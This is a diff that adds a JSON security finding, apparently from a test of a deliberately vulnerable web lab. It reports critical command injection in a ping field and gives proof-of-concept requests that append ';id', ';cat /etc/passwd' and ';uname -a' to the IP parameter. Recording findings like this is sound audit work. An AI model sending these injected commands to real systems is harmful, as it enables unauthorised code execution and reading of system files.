@@ -1,0 +1,11 @@
+{
+  "title": "Command Injection - Remote Code Execution via ping parameter",
+  "severity": "Critical",
+  "location": "/vulnerabilities/exec/",
+  "proof": "POST to /vulnerabilities/exec/ with ip=127.0.0.1%3B+id returned ping output followed by 'uid=33(www-data) gid=33(www-data) groups=33(www-data)'. Shell injection confirmed with semicolon separator. Full OS command execution as www-data user.",
+  "poc_steps": [
+    "POST /vulnerabilities/exec/ with ip=127.0.0.1;id",
+    "POST /vulnerabilities/exec/ with ip=127.0.0.1;cat+/etc/passwd",
+    "POST /vulnerabilities/exec/ with ip=127.0.0.1;uname+-a"
+  ]
+}
